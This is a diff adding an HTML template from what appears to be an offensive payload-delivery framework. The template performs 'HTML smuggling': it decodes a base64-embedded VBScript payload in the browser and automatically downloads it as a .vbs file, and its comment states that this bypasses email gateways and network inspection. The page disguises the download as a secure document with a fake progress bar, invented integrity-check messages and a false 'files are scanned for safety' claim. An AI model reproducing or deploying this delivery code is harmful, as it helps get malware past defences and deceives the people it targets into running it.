@@ -1,0 +1,60 @@
+<!-- chunk: delivery/html_smuggling -->
+<!-- provides: html_smuggling_download -->
+<!-- format: html -->
+<!-- description: HTML smuggling for VBScript — decodes embedded base64 payload client-side and triggers .vbs download. Bypasses email gateways and network inspection. -->
+<!-- vars: PAYLOAD_B64, FILENAME, DOC_TITLE -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>{{DOC_TITLE}}</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#f5f6fa;display:flex;align-items:center;justify-content:center;min-height:100vh;color:#2d3436}
+.card{background:#fff;border-radius:12px;box-shadow:0 2px 24px rgba(0,0,0,.08);padding:48px 56px;max-width:480px;width:90%;text-align:center}
+.icon{width:64px;height:64px;margin:0 auto 20px;background:#0078d4;border-radius:14px;display:flex;align-items:center;justify-content:center}
+.icon svg{width:32px;height:32px;fill:#fff}
+h1{font-size:18px;font-weight:600;margin-bottom:8px}
+.sub{font-size:13px;color:#636e72;margin-bottom:28px}
+.bar-wrap{background:#e9ecef;border-radius:6px;height:8px;overflow:hidden;margin-bottom:16px}
+.bar{background:linear-gradient(90deg,#0078d4,#00b4d8);height:100%;width:0;border-radius:6px;transition:width .3s ease}
+.status{font-size:12px;color:#b2bec3}
+.retry{display:none;margin-top:16px;padding:10px 24px;background:#0078d4;color:#fff;border:none;border-radius:6px;cursor:pointer;font-size:13px}
+.retry:hover{background:#005fa3}
+.footer{margin-top:32px;font-size:11px;color:#b2bec3}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="icon"><svg viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zm-1 2l5 5h-5V4zM6 20V4h5v7h7v9H6z"/></svg></div>
+<h1>Preparing your document</h1>
+<p class="sub">Your file is being prepared for download. This may take a moment.</p>
+<div class="bar-wrap"><div class="bar" id="bar"></div></div>
+<p class="status" id="status">Initializing...</p>
+<button class="retry" id="retry" onclick="doDownload()">Download manually</button>
+<p class="footer">Secured document delivery &bull; Files are scanned for safety</p>
+</div>
+<script>
+(function(){
+var d="{{PAYLOAD_B64}}",fn="{{FILENAME}}";
+if(!fn||fn.indexOf("{{")==0)fn="document.vbs";
+var bar=document.getElementById("bar"),st=document.getElementById("status"),rt=document.getElementById("retry");
+var pct=0;
+function tick(){pct=Math.min(pct+Math.random()*15+5,95);bar.style.width=pct+"%";if(pct<40)st.textContent="Verifying document integrity...";else if(pct<70)st.textContent="Preparing secure download...";else st.textContent="Almost ready...";}
+var iv=setInterval(tick,400);
+function b64decode(s){var r=atob(s),a=new Uint8Array(r.length);for(var i=0;i<r.length;i++)a[i]=r.charCodeAt(i);return a;}
+window.doDownload=function(){
+try{
+var bytes=b64decode(d);
+var blob=new Blob([bytes],{type:"application/octet-stream"});
+if(window.navigator&&window.navigator.msSaveBlob){window.navigator.msSaveBlob(blob,fn);}
+else{var u=URL.createObjectURL(blob);var a=document.createElement("a");a.href=u;a.download=fn;document.body.appendChild(a);a.click();setTimeout(function(){document.body.removeChild(a);URL.revokeObjectURL(u);},200);}
+clearInterval(iv);bar.style.width="100%";st.textContent="Download started — check your Downloads folder";
+}catch(e){clearInterval(iv);st.textContent="Error preparing file. Click below to retry.";rt.style.display="inline-block";}
+};
+setTimeout(function(){doDownload();},2200);
+})();
+</script>
+</body>
+</html>
